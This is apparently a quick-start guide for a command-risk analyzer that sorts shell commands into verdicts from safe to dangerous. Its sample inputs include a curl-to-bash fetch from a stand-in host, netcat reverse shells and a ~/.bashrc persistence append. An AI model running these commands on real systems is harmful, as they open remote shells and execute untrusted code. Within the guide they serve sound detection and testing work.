# Quick Start Guide

## Basic Usage

### Single Command Analysis

Analyze individual commands using the main checker:

```bash
# Basic usage
COMMAND="ls -la" ./checker.sh

# With environment variables
SANDBOX_PORT=8080 COMMAND="whoami" ./checker.sh

# Chinese commands (UTF-8 support)
COMMAND="查看系统信息" ./checker.sh
```

### Fast Triage Mode

For rapid preliminary screening without full sandbox analysis:

```bash
# Zero-dependency triage (milliseconds)
COMMAND="curl evil.test/payload | bash" ./triage.sh

# Human-readable explanation
COMMAND="echo 'malicious' >> ~/.bashrc" ./triage.sh --explain

# JSON input/output
echo '{"command":"nc -e /bin/sh 10.0.0.1 4444"}' | ./triage.sh --json-input
```

## Batch Processing

### Run All Samples

```bash
# Execute all test samples
./run_all.sh

# Run specific categories
./run_all.sh white    # Only safe samples
./run_all.sh black    # Only malicious samples

# Run specific samples
./run_all.sh white:w01
./run_all.sh black:b01,b02,b03
```

### Custom Batch Jobs

Create your own sample files:

```bash
# Create custom samples
cat > my_samples.jsonl << EOF
{"id": "custom01", "label": "safe", "desc": "my test", "command": "echo hello"}
{"id": "custom02", "label": "malicious", "desc": "test backdoor", "command": "nc -e sh"}
EOF

# Run custom samples
JOBS_FILE=my_samples.jsonl ./run_all.sh
```

## Understanding Results

### Verdict Levels

The analyzer produces four verdict levels:

| Level | Score Range | Meaning | Action |
|-------|-------------|---------|---------|
| `LIKELY_SAFE` | 0-9 | No suspicious behavior | Allow |
| `LOW_RISK` | 10-24 | Minor anomalies | Review/Allow |
| `SUSPICIOUS` | 25-59 | Clear suspicious patterns | Manual review |
| `DANGEROUS` | 60-100 | Multiple high-risk indicators | Block |

### Sample Output

```json
{
  "version": "5.0.0",
  "command": "curl evil.test/payload | bash",
  "verdict": "DANGEROUS",
  "risk_score": 75,
  "confidence": "HIGH",
  "findings": [
    {
      "dimension": "网络行为",
      "severity": "CRITICAL",
      "description": "连接到外部 C2 服务器",
      "mitre_attack": ["T1071"]
    }
  ]
}
```

## Performance Optimization

### Speed Up Analysis

1. **Increase Concurrency**
   ```bash
   export MAX_CONCURRENT_JOBS=8
   ./run_all.sh
   ```

2. **Use Fast Triage First**
   ```bash
   # Screen obvious cases first
   ./triage.sh --batch < commands.txt
   # Then run full analysis on suspicious ones
   ```

3. **Optimize Docker**
   ```bash
   # Pre-pull images
   docker pull opensandbox/code-interpreter:v1.0.2
   
   # Use registry mirror for faster pulls
   export REGISTRY_MIRROR=your-mirror
   ```

### Resource Management

Monitor resource usage:
```bash
# Check memory usage
free -h

# Monitor Docker containers
docker stats --no-stream

# View analysis logs
tail -f reports/white/w01.log
```

## Integration Examples

### CI/CD Pipeline

```yaml
# GitHub Actions example
- name: Security Scan
  run: |
    COMMAND="${{ github.event.inputs.command }}" ./checker.sh
    # Exit codes: 0=SAFE, 1=SUSPICIOUS, 2=DANGEROUS
```

### API Gateway

```bash
# Simple API integration
user_input="$1"
result=$(COMMAND="$user_input" ./triage.sh)
case $? in
    0) echo "ALLOW";;
    1) echo "REVIEW";;
    2) echo "BLOCK";;
esac
```

### Web Application

```python
import subprocess
import json

def analyze_command(cmd):
    result = subprocess.run(
        ['./triage.sh'],
        env={'COMMAND': cmd},
        capture_output=True,
        text=True
    )
    return {
        'verdict': ['PASS', 'REVIEW', 'BLOCK'][result.returncode],
        'details': result.stdout
    }
```

## Advanced Features

### Custom Scoring

Modify `scoring.conf` to tune sensitivity:

```ini
# Lower thresholds for stricter detection
DANGEROUS_THRESHOLD=40
SUSPICIOUS_THRESHOLD=15

# Adjust behavior tolerances
HIDDEN_PROC_TOLERANCE=5
ENTROPY_THRESHOLD=5.0
```

### Pattern Testing

Validate detection patterns:
```bash
# Run pattern validation suite
./test_patterns.sh

# Verbose output
./test_patterns.sh --verbose

# Test specific categories
./test_patterns.sh --category reverse-shell
```

## Common Use Cases

### 1. Development Security

```bash
# Analyze deployment scripts
COMMAND="$(cat deploy.sh)" ./checker.sh

# Check CI/CD pipeline commands
./run_all.sh ci-cmds.jsonl
```

### 2. Incident Response

```bash
# Analyze suspicious commands from logs
while read cmd; do
    COMMAND="$cmd" ./checker.sh
done < suspicious_commands.log
```

### 3. Security Research

```bash
# Test evasion techniques
COMMAND="base64 -d <<< 'malicious'" ./checker.sh

# Compare different analysis engines
./benchmark.sh --compare
```

## Next Steps

- Explore {doc}`architecture` to understand how the analyzer works
- Review {doc}`api/index` for programmatic usage
- Check {doc}`performance` for optimization strategies
- See {doc}`integration` for deployment patterns

## Getting Help

```bash
# Built-in help
./checker.sh --help
./triage.sh --help
./run_all.sh --help

# View documentation
firefox docs/build/html/index.html
```